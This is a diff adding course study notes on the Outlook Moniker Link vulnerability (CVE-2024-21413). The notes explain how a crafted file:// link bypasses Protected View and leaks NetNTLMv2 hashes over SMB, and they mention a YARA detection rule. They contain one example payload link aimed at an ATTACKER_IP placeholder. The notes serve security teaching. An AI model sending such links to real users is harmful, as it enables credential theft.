@@ -373,6 +373,16 @@ _Learn how to use John the Ripper, a powerful and adaptable hash-cracking tool._
 
 ## 7. Exploitation Basics
 
+This module begins with the **Moniker Link exploit (CVE-2024-21413)**. This vulnerability bypasses **Outlook’s** security checks when handling a special hyperlink called a **Moniker Link**. An attacker can send a crafted email with a malicious Moniker Link, tricking **Outlook** into sending the user’s NTLM credentials once the link is clicked.
+
+Outlook can handle normal web links like `http` and `https`, but it can also open `file://` Moniker Links that point to files or applications. Normally, clicking these links triggers **Protected View**, which opens content read-only and blocks macros.
+
+The issue arises when the link includes a `!` character with extra text, which bypasses Protected View. For example: `<a href="file://ATTACKER_IP/test!exploit">Click me</a>`. The SMB protocol tries to authenticate using local credentials even if the file share doesn’t exist, sending the victim’s Windows **NetNTLMv2 hash** to the attacker.
+
+**Remote Code Execution (RCE)** is theoretically possible because Moniker Links interact with Windows **Component Object Model (COM)**, but this is out of scope here since no public proof-of-concept for RCE with this CVE exists yet.
+
+**Florian Roth** developed a **YARA rule** to help detect emails that contain the `file://` element used in a malicious Moniker Link. This rule makes it easier to spot potential abuse of this exploit in email traffic.
+
 ---
 
 ## 8. Web Hacking
